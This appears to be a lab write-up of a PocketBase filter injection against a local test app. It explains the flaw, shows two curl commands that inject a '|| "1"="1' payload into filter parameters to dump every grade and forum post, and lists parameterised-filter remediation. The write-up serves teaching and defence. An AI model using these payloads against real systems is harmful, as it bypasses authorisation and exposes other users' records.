# Breach 15 — PocketBase Filter Injection — *no flag*

**OWASP:** A03:2021 – Injection

## What it is
User input concatenated into a PocketBase **filter string** without
sanitisation, letting an attacker inject filter syntax (a NoSQL-style injection).

## How the breach works
```bash
# break out of the filter -> dump all grades regardless of student
curl -s --get "http://localhost:4942/api/grades" \
     --data-urlencode 'student=x" || "1"="1'
# forum search: same trick returns every post
curl -s --get "http://localhost:4942/forum" \
     --data-urlencode 'search=zzz" || "1"="1'
```
`/api/docs-internal` even documents the sink.

## Impact
Authorisation bypass on record filtering; enumerate other users' records and,
via relation traversal in the filter, reach fields that should be hidden.

## How it could have been avoided (remediation)
- Use **parameterised** PocketBase filters: `filter="student={:id}", {"id":...}`.
- Never concatenate user input into filter strings; enforce collection API rules
  server-side.
